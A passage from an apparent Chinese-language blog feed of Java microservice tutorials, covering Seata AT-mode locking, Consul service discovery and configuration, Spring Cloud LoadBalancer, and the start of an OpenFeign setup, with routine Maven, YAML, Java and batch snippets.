class="type">TIMESTAMP</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  log_modified <span class="type">TIMESTAMP</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="2-全局锁机制"><a href="#2-全局锁机制" class="headerlink" title="2. 全局锁机制"></a><strong>2. 全局锁机制</strong></h5><ul>
<li><strong>目的</strong>：防止其他事务在全局事务未完成时修改相同数据（避免脏写）。  </li>
<li><strong>实现</strong>：  <ul>
<li>在 Phase 1，RM 向 TC 注册分支事务时，TC 会为涉及的数据行 <strong>注册全局锁</strong>。  </li>
<li>其他事务修改同一数据时，会尝试获取全局锁，若失败则阻塞或重试。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="AT-模式-vs-传统-2PC"><a href="#AT-模式-vs-传统-2PC" class="headerlink" title="AT 模式 vs 传统 2PC"></a><strong>AT 模式 vs 传统 2PC</strong></h4><table>
<thead>
<tr>
<th><strong>特性</strong></th>
<th><strong>AT 模式</strong></th>
<th><strong>传统 2PC</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>本地事务提交</strong></td>
<td>Phase 1 直接提交，无需长时间锁资源</td>
<td>Phase 1 仅预提交，资源需锁定到 Phase 2</td>
</tr>
<tr>
<td><strong>侵入性</strong></td>
<td>对业务代码无侵入</td>
<td>需手动编写 Prepare&#x2F;Commit&#x2F;Rollback</td>
</tr>
<tr>
<td><strong>性能</strong></td>
<td>高（Phase 1 提前提交）</td>
<td>低（资源锁定时间长）</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>基于关系型数据库的简单分布式事务</td>
<td>强一致性要求极高的场景</td>
</tr>
</tbody></table>
<hr>
<h4 id="AT-模式的典型问题"><a href="#AT-模式的典型问题" class="headerlink" title="AT 模式的典型问题"></a><strong>AT 模式的典型问题</strong></h4><ol>
<li><p><strong>脏写问题</strong>：  </p>
<ul>
<li>若全局事务未提交时，其他事务绕过 Seata 直接修改数据（如手动执行 SQL），可能导致数据不一致。  </li>
<li><strong>解决方案</strong>：所有数据操作必须通过 Seata 的 <code>DataSourceProxy</code>。</li>
</ul>
</li>
<li><p><strong>回滚冲突</strong>：  </p>
<ul>
<li>回滚时发现数据已被其他事务修改（与后置镜像不一致），需人工处理。  </li>
<li><strong>优化方案</strong>：业务设计时减少长事务，或使用 TCC 模式。</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>微服务</tag>
        <tag>SpringCloudAlibaba</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Cloud2-SpringCloud</title>
    <url>/2025/02/18/Java-Cloud2-SpringCloud/</url>
    <content><![CDATA[<p>引入：之前的微服务项目中，需要调用其他微服务时必须在代码中显示说明微服务的IP和端口号，一旦提供者微服务的IP和端口发生变化将导致整体不可以，同时也无法实现微服务的负载均衡功能，不利于后期的维护。因此在微服务项目中，<strong>需要引入服务治理功能，实现微服务之间的动态注册和发现。</strong></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250303174032.png"></p>
<p>微服务项目架构：</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250226185819.png"></p>
<h2 id="consul服务注册与发现"><a href="#consul服务注册与发现" class="headerlink" title="consul服务注册与发现"></a>consul服务注册与发现</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>为什么不使用Eureka</strong></p>
<p>Eureka已经停止更新，且其的自我保护机制对初学者不太友好。同时，Eureka需要程序员编写开发并作为一个微服务部署在项目中，这与当前注册中心独立且与微服务功能解耦的需求不符。此外，Alibaba的Nacos不仅可以完成服务注册和发现，还可以进行配置管理。</p>
<p><a href="https://www.consul.io/">官网</a>       <a href="https://docs.spring.io/spring-cloud-consul/docs/current/reference/html/">教程</a>         <a href="https://github.com/spring-cloud/spring-cloud-consul">源码地址</a></p>
<p><strong>Consul</strong> 是一个由 HashiCorp 开发的<strong>分布式服务发现与配置管理工具</strong>，主要用于支持微服务架构下的服务注册、服务发现和健康检查。Consul 是一个高可用、分布式的系统，能够帮助服务之间进行通信和协调。以下是其简要介绍：</p>
<ol>
<li><strong>特点</strong>：<ul>
<li>支持多数据中心。</li>
<li>提供内置的服务发现功能。</li>
<li>内置健康检查机制，确保调用的是健康的实例。</li>
<li>提供 Key&#x2F;Value 存储功能，用于动态配置管理。</li>
</ul>
</li>
<li><strong>作用</strong>：<ul>
<li><strong>服务注册与发现</strong>：微服务可以向 Consul 注册自己，并通过 Consul 查找其他服务。</li>
<li><strong>健康检查</strong>：支持对服务、节点或自定义脚本的健康状态检查。</li>
<li><strong>分布式配置管理</strong>：通过 Key&#x2F;Value 存储实现动态配置更新。</li>
</ul>
</li>
<li><strong>应用场景</strong>：适用于需要动态扩展、服务间通信和高可用性的微服务架构。</li>
</ol>
<p>例如，在微服务架构中，Consul 可以用来管理多个服务实例的地址和状态，确保客户端始终调用可用的服务实例。</p>
<h4 id="下载安装启动"><a href="#下载安装启动" class="headerlink" title="下载安装启动"></a>下载安装启动</h4><p><a href="https://developer.hashicorp.com/consul/install?product_intent=consul">下载地址</a></p>
<p>根据自己的系统版本下载对应安装包，windows下安装解压可见一个exe可执行文件，在exe文件目录下打开终端输入：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">./consul --version</span><br></pre></td></tr></table></figure>

<p>如果可见版本输出，即安装成功。</p>
<p><strong>启动：</strong>以开发者模式启动，终端执行命令：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">./consul agent -dev</span><br></pre></td></tr></table></figure>

<p>验证：浏览器访问<code>http://localhost:8500/</code>可见consul首页，即启动成功。</p>
<hr>
<h3 id="服务注册与发现"><a href="#服务注册与发现" class="headerlink" title="服务注册与发现"></a>服务注册与发现</h3><p> <a href="https://docs.spring.io/spring-cloud-consul/docs/current/reference/html/">官网教程</a>    </p>
<h4 id="服务提供者"><a href="#服务提供者" class="headerlink" title="服务提供者"></a>服务提供者</h4><p><strong>步骤1：在微服务项目中引入依赖：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-consul-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>步骤2：在yaml配置文件中添加相关配置</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">consul:</span></span><br><span class="line">      <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">8500</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">service-name:</span> <span class="string">$&#123;spring.application.name&#125;</span>  <span class="comment"># 当前微服务以此名称入驻到consul中</span></span><br></pre></td></tr></table></figure>



<p><strong>步骤3：改写主启动类，添加注解<code>@EnableDiscoveryClient</code></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.fu.mapper&quot;)</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main8001</span> &#123;</span><br><span class="line"> ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="服务消费者"><a href="#服务消费者" class="headerlink" title="服务消费者"></a>服务消费者</h4><p><strong>前3步同上。</strong></p>
<p><strong>步骤4</strong>：修改<code>Controller</code>，将固定编码的微服务IP和端口替换为服务注册中心的微服务名称（即yaml文件中<code>spring-cloud-consul-discovery-service-name</code>配置项的内容)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原来固定编码的IP和端口</span></span><br><span class="line"><span class="comment">// public static final String PaymentSrv_URL = &quot;http://localhost:8001&quot;;</span></span><br><span class="line"><span class="comment">// 现在软编码为yaml中配置的</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PaymentSrv_URL</span> <span class="operator">=</span> <span class="string">&quot;http://cloud-payment-service&quot;</span>;</span><br></pre></td></tr></table></figure>



<p><strong>步骤5：</strong>修改<code>RestTemplateConfig</code>，使用注解<code>@LoadBalanced</code>开启负载均衡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h4 id="三大主流注册中心对比"><a href="#三大主流注册中心对比" class="headerlink" title="三大主流注册中心对比"></a>三大主流注册中心对比</h4><p><strong>CAP 定理</strong>：在分布式系统中，无法同时完全满足 <strong>Consistency（一致性）、Availability（可用性）、Partition Tolerance（分区容错性）</strong>这三个特性，最多只能同时满足其中的两个。</p>
<p>以下是 <strong>Eureka、Consul 和 Zookeeper</strong> 三大注册中心的对比表格，按照开发语言、CAP特性、服务健康检查、对外暴露接口等维度进行比较：</p>
<table>
<thead>
<tr>
<th><strong>对比项</strong></th>
<th align="center"><strong>Eureka</strong></th>
<th><strong>Consul</strong></th>
<th><strong>Zookeeper</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>开发语言</strong></td>
<td align="center">Java</td>
<td>Go</td>
<td>Java</td>
</tr>
<tr>
<td><strong>CAP特性</strong></td>
<td align="center">AP</td>
<td>CP&#x2F;AP（可配置，默认偏向CP）</td>
<td>CP</td>
</tr>
<tr>
<td><strong>服务健康检查</strong></td>
<td align="center">内置心跳机制，客户端主动上报健康状态，服务端被动感知</td>
<td>支持多种健康检查方式（HTTP、TCP、自定义脚本），主动探测</td>
<td>不内置健康检查功能，需结合第三方工具实现</td>
</tr>
<tr>
<td><strong>对外暴露接口</strong></td>
<td align="center">HTTP</td>
<td>HTTP &#x2F;DNS</td>
<td>基于 Zookeeper 协议的客户端 API</td>
</tr>
<tr>
<td><strong>数据存储方式</strong></td>
<td align="center">内存中存储服务注册信息，不持久化</td>
<td>使用 Raft 算法实现分布式一致性存储，支持持久化</td>
<td>基于 ZAB 协议实现分布式一致性存储，支持持久化</td>
</tr>
</tbody></table>
<ul>
<li><strong>AP 系统</strong>：优先保证 <strong>可用性（Availability）</strong> 和 <strong>分区容错性（Partition Tolerance）</strong>，可能牺牲一致性。</li>
<li><strong>CP 系统</strong>：优先保证 <strong>一致性（Consistency）</strong> 和 <strong>分区容错性（Partition Tolerance）</strong>，可能牺牲可用性。</li>
</ul>
<p><strong>总结</strong>：</p>
<ul>
<li><strong>Eureka</strong>：适合 Spring Cloud 生态的用户，简单易用，但官方已停止更新。</li>
<li><strong>Consul</strong>：功能全面，支持多数据中心和健康检查，适合复杂的微服务架构。同时其还具有分布式配置的功能。</li>
<li><strong>Zookeeper</strong>：经典老牌工具，适合需要分布式协调和可靠性的场景，但配置复杂。</li>
</ul>
<hr>
<h3 id="分布式配置"><a href="#分布式配置" class="headerlink" title="分布式配置"></a>分布式配置</h3><p>微服务意味着要将单体应用中的业务拆分成一个个子服务，每个服务的粒度相对较小，因此系统中会出现大量的服务。由于每个服务都需要必要的配置信息才能运行，所以一套集中式的、动态的配置管理设施是必不可少的。比如某些配置文件中的内容大部分都是相同的，只有个别的配置项不同。就拿数据库配置来说吧，如果每个微服务使用的技术栈都是相同的，则每个微服务中关于数据库的配置几乎都是相同的，有时候主机迁移了，我希望<strong>一次修改，处处生效</strong>。</p>
<p> 将通用全局配置信息注册到Consul服务器，从Consul获取</p>
<p><a href="https://blog.csdn.net/weixin_41859354/article/details/141757785">参考文档</a></p>
<p><strong>配置步骤</strong></p>
<p><strong>步骤1：</strong>引入依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-consul-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-bootstrap<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>步骤2：</strong>在<code>application.yaml</code>同级别目录下，新增<code>bootstrap.yaml</code>文件。改写<code>application.yaml</code>，将与consul服务器相关的配置移动到<code>bootstrap.yaml</code>:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-payment-service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">consul:</span></span><br><span class="line">      <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">8500</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">service-name:</span> <span class="string">$&#123;spring.application.name&#125;</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="comment"># 多环境时配置文件的标注分隔符，如开发环境下命名为application-dev.yaml,使用&#x27;-&#x27;分隔</span></span><br><span class="line">        <span class="comment"># 默认为英文逗号</span></span><br><span class="line">        <span class="attr">profile-separator:</span> <span class="string">&#x27;-&#x27;</span></span><br><span class="line">        <span class="comment"># 配置文件格式</span></span><br><span class="line">        <span class="attr">format:</span> <span class="string">yaml</span></span><br></pre></td></tr></table></figure>

<p>说明：</p>
<blockquote>
<p>applicaiton.yml是用户级的资源配置项，bootstrap.yml是系统级的，优先级更加高</p>
<p>Spring Cloud会创建一个“Bootstrap Context”，作为Spring应用的<code>Application Context</code>的父上下文。初始化的时候，<code>Bootstrap Context</code>负责从外部源加载配置属性并解析配置。这两个上下文共享一个从外部获取的<code>Environment</code>。</p>
<p><code>Bootstrap</code>属性有高优先级，默认情况下，它们不会被本地配置覆盖。 <code>Bootstrap context</code>和<code>Application Context</code>有着不同的约定，所以新增了一个<code>bootstrap.yml</code>文件，保证<code>Bootstrap Context</code>和<code>Application Context</code>配置的分离。</p>
<p> application.yml文件改为bootstrap.yml,这是很关键的或者两者共存（推荐）</p>
<p>因为bootstrap.yml是比application.yml先加载的。bootstrap.yml优先级高于application.yml</p>
</blockquote>
<p><strong>步骤3：</strong>在consul服务器中添加全局配置。</p>
<p>在<code>http://localhost:8500/ui/dc1/kv</code>中添加<code>k-v</code>键值对形式的配置项，</p>
<ol>
<li>必须新建一个<code>config</code>文件夹</li>
<li>然后在其目录下建一个<strong>子文件夹</strong>，命名可以根据配置的作用范围确定:<ul>
<li><code>application</code>: 公共配置，所有应用共享。</li>
<li><code>&#123;application&#125;</code>: 特定应用的配置。<code>&#123;application&#125;</code>即配置项<code>spring-application-name</code>的内容</li>
<li><code>&#123;application&#125;-&#123;profile&#125;</code>: 针对特定环境的应用配置，例如 <code>dev</code>、<code>prod</code>。</li>
</ul>
</li>
<li>在子文件夹下创建yaml形式配置项。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250222233451.png"></p>
<p><strong>验证步骤：</strong>读取配置验证</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value = &quot;/pay/info&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">(<span class="meta">@Value(&quot;$&#123;fu.info&#125;&quot;)</span> String info)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="动态刷新"><a href="#动态刷新" class="headerlink" title="动态刷新"></a>动态刷新</h4><p>为使得consul服务器中的配置更新后，微服务读取到的配置立即更新，需要做如下修改：</p>
<p><strong>在主启动类上添加注解<code>@RefreshScope</code></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//... 上面的注解略</span></span><br><span class="line"><span class="meta">@RefreshScope</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main8001</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        SpringApplication.run(Main8001.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以等待一段时间后主动刷新，由配置项 <code>spring-cloud-consul-config-watch-wait-time</code> 控制，默认55秒，生产中<strong>不建议更改</strong>此配置项。</p>
<h3 id="配置持久化"><a href="#配置持久化" class="headerlink" title="配置持久化"></a>配置持久化</h3><p><a href="https://www.bilibili.com/video/BV1gW421P7RD?vd_source=20530c92c1be8bd70e37346e3a5c037a&spm_id_from=333.788.player.switch&p=31">视频教程</a></p>
<p>Windows系统下，新建一个.bat可执行文件，输入如下命令：</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span>.consul server <span class="built_in">start</span>......  </span><br><span class="line">@<span class="built_in">echo</span> off  </span><br><span class="line"># E:\consul_1.<span class="number">17</span>.<span class="number">1</span>\consul.exe    consul.exe的路径</span><br><span class="line"># E:\consul_1.<span class="number">17</span>.<span class="number">1</span>\mydata 持久化文件保存位置</span><br><span class="line">@sc create Consul binpath= &quot;E:\consul_1.<span class="number">17</span>.<span class="number">1</span>\consul.exe agent -server -ui -bind=<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> -client=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> -bootstrap-expect  <span class="number">1</span>  -data-<span class="built_in">dir</span> E:\consul_1.<span class="number">17</span>.<span class="number">1</span>\mydata   &quot;</span><br><span class="line">@<span class="built_in">net</span> <span class="built_in">start</span> Consul</span><br><span class="line">@sc config Consul <span class="built_in">start</span>= AUTO  </span><br><span class="line">@<span class="built_in">echo</span>.Consul <span class="built_in">start</span> is OK......success</span><br><span class="line">@<span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>以管理员身份启动bat。</p>
<hr>
<h2 id="LoadBalancer负载均衡服务调用"><a href="#LoadBalancer负载均衡服务调用" class="headerlink" title="LoadBalancer负载均衡服务调用"></a>LoadBalancer负载均衡服务调用</h2><p>原来使用SpringCloud Ribbon，这是一个基于Netflix Ribbon实现的一套客户端，是一个负载均衡工具，现已停止维护。</p>
<p><a href="https://spring.io/projects/spring-cloud-commons">官网</a>     <a href="https://docs.spring.io/spring-cloud-commons/reference/spring-cloud-commons/loadbalancer.html">教程</a></p>
<h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p><strong>Spring Cloud LoadBalancer</strong> 是 Spring Cloud 提供的一个用于实现客户端负载均衡的组件。它通过内置的负载均衡算法（如轮询、随机等），选择合适的服务实例进行通信。从而帮助微服务架构中的客户端在多个服务实例之间分配请求，提高系统的可用性和扩展性。主要用于基于 Spring Cloud 的微服务应用中，与 Ribbon（现已进入维护模式）相比，LoadBalancer 是更现代化的选择。支持可插拔的负载均衡算法、易于集成和配置。</p>
<h4 id="loadbalancer本地负载均衡客户端-VS-Nginx服务端负载均衡区别"><a href="#loadbalancer本地负载均衡客户端-VS-Nginx服务端负载均衡区别" class="headerlink" title="loadbalancer本地负载均衡客户端 VS Nginx服务端负载均衡区别"></a>loadbalancer本地负载均衡客户端 VS Nginx服务端负载均衡区别</h4><table>
<thead>
<tr>
<th><strong>特性</strong></th>
<th><strong>Spring Cloud LoadBalancer（客户端负载均衡）</strong></th>
<th><strong>Nginx（服务端负载均衡）</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>工作位置</strong></td>
<td>在<strong>客户端应用内部</strong>运行，由客户端决定请求分发到哪个服务实例。</td>
<td>在<strong>服务端</strong>运行，作为独立的代理服务器接收请求并转发到后端服务实例。</td>
</tr>
<tr>
<td><strong>实现方式</strong></td>
<td>通过代码和配置文件实现，通常与微服务框架（如 Spring Cloud）集成。</td>
<td>配置文件驱动，基于反向代理机制实现负载均衡。</td>
</tr>
<tr>
<td><strong>负载均衡算法支持</strong></td>
<td>支持多种内置算法（如轮询、随机等），并且可以自定义扩展。</td>
<td>提供多种内置算法（如轮询、加权轮询、IP哈希等），也可以通过模块扩展。</td>
</tr>
<tr>
<td><strong>动态服务发现</strong></td>
<td>自动集成服务注册与发现机制（如 Eureka、Consul），能够实时感知服务实例的变化。</td>
<td>需要手动更新配置文件或借助第三方工具（如 Consul Template）实现动态更新。</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>更适合微服务架构中的服务间通信，特别是在分布式系统中需要动态发现服务实例的场景。</td>
<td>更适合外部流量进入系统的入口处，用于分发用户请求到后端服务。</td>
</tr>
<tr>
<td><strong>性能开销</strong></td>
<td>客户端需要维护服务实例列表并执行负载均衡逻辑，可能会增加一定的计算开销。</td>
<td>Nginx 是 C 语言实现，性能较高，但对大规模动态服务列表的支持较弱。</td>
</tr>
<tr>
<td><strong>依赖性</strong></td>
<td>依赖于微服务框架和服务注册中心（如 Eureka）。</td>
<td>独立运行，不依赖其他组件，但需要额外管理配置文件。</td>
</tr>
<tr>
<td><strong>监控与日志</strong></td>
<td>日志和监控功能需要通过框架集成或第三方工具实现。</td>
<td>内置丰富的日志和监控功能，便于分析流量分布和性能问题。</td>
</tr>
</tbody></table>
<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250223115742.png"></p>
<p><strong>第一步</strong>，先选择ConsulServer从服务端查询并拉取服务列表，知道了它有多个服务(上图3个服务)，这3个实现是完全一样的，默认轮询调用谁都可以正常执行。类似生活中求医挂号，某个科室今日出诊的全部医生，客户端你自己选一个。</p>
<p><strong>第二步</strong>，按照指定的负载均衡策略从server取到的服务注册列表中由客户端自己选择一个地址，所以LoadBalancer是一个<strong>客户端的</strong>负载均衡器。</p>
<hr>
<h3 id="使用（以RestTemplate为例"><a href="#使用（以RestTemplate为例" class="headerlink" title="使用（以RestTemplate为例)"></a>使用（以RestTemplate为例)</h3><p><a href="https://docs.spring.io/spring-cloud-commons/reference/spring-cloud-commons/common-abstractions.html#rest-template-loadbalancer-client">官网使用教程</a></p>
<p>案例：将上述支付微服务克隆多份，分别运行在8001~8003端口，订单微服务轮询负载均衡地访问。</p>
<h4 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h4><p><strong>步骤1：</strong>修改服务消费者模块（即订单微服务）的POM，引入如下依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-loadbalancer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤2：修改RestTemplateConfig，添加注解@LoadBalanced开启负载均衡。</strong></p>
<p><strong>注意：</strong>依赖<code>spring-cloud-starter-consul-discovery</code>中实际已经包含了<code>spring-cloud-starter-loadbalancer</code>，因此使用consul时无需任何操作即可自动实现负载均衡！</p>
<h4 id="均衡算法切换"><a href="#均衡算法切换" class="headerlink" title="均衡算法切换"></a>均衡算法切换</h4><p>默认为轮询负载均衡，以下是切换为随机负载均衡的方式</p>
<p>需要改写<code>RestTemplateConfig</code></p>
<ul>
<li>添加类注解<code>@LoadBalancerClient(value=&quot;微服务名&quot;, configuration=RestTemplateConfig.class)</code></li>
<li>添加方法如下。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@LoadBalancerClient(value=&quot;微服务名&quot;,configuration=RestTemplateConfig.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    ReactorLoadBalancer&lt;ServiceInstance&gt; <span class="title function_">randomLoadBalancer</span><span class="params">(Environment environment,</span></span><br><span class="line"><span class="params">                                                            LoadBalancerClientFactory loadBalancerClientFactory)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> environment.getProperty(LoadBalancerClientFactory.PROPERTY_NAME);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RandomLoadBalancer</span>(loadBalancerClientFactory.getLazyProvider(name, ServiceInstanceListSupplier.class), name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<hr>
<h2 id="OpenFeign服务接口调用"><a href="#OpenFeign服务接口调用" class="headerlink" title="OpenFeign服务接口调用"></a>OpenFeign服务接口调用</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p><a href="https://docs.spring.io/spring-cloud-openfeign/reference/">官网</a>  <a href="https://github.com/spring-cloud/spring-cloud-openfeign">源码</a>  </p>
<p>OpenFeign 是一个基于 Java 的<strong>声明式 HTTP 客户端</strong>，主要用于简化微服务之间的通信。它通过注解方式定义接口，将方法调用转化为 HTTP 请求，从而实现服务间的远程调用功能。OpenFeign 自动集成了 Ribbon  或  LoadTemplate 等 实现负载均衡，并支持与 Eureka  或  Consul 配合使用进行服务发现，同时还可以结合 Hystrix  或  Alibaba Sentinel 提供熔断保护机制，确保系统稳定性。开发者只需定义简单的接口和注解，无需编写复杂的请求代码，即可完成服务调用，大大提高了开发效率和代码可读性。</p>
<p><strong>使用 OpenFeign 后，就不需要让每个调用某微服务的其他微服务都通过 RestTemplate 手动编写调用代码了。</strong></p>
<p><strong>为什么选择OpenFeign而不是SpringCloud LoadBalancer+RestTemplate？</strong></p>
<p>在实际开发中，使用 <strong>SpringCloud LoadBalancer + RestTemplate</strong> 的方式时，通常会利用 RestTemplate 对 HTTP 请求进行封装，形成一套模板化的调用方法。然而，当一个接口被多处调用时，为了减少重复代码，开发者往往需要针对每个微服务自行封装客户端类来包装这些依赖服务的调用。</p>
<p>相比之下，<strong>OpenFeign</strong> 在此基础上进行了进一步封装，通过定义和实现依赖服务接口的方式，简化了服务调用的过程。具体来说：</p>
<ol>
<li><strong>声明式接口定义</strong>：只需创建一个接口并使用 <code>@FeignClient</code> 注解进行配置，即可完成对服务提供方接口的绑定。</li>
<li><strong>降低开发成本</strong>：统一对外暴露可调用的接口方法，减少了手动封装客户端类的工作量。</li>
<li><strong>集成负载均衡</strong>：OpenFeign 内置集成了 SpringCloud LoadBalancer，能够为 HTTP 客户端提供负载均衡功能。</li>
<li><strong>支持熔断与降级</strong>：可以轻松集成阿里巴巴 Sentinel，提供熔断、降级等高可用特性。</li>
<li><strong>优雅的服务调用</strong>：相比手动封装 RestTemplate，OpenFeign 以声明式的方法实现了更简洁、直观的服务调用方式。</li>
</ol>
<p>因此，在微服务架构中，OpenFeign 提供了一种更高效、更优雅的解决方案，尤其适合需要频繁调用多个服务的场景。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250223221803.png"></p>
<h3 id="服务消费者配置"><a href="#服务消费者配置" class="headerlink" title="服务消费者配置"></a>服务消费者配置</h3><p><strong>步骤1：引入<code>spring-cloud-starter-openfeign</code>依赖</strong></p>
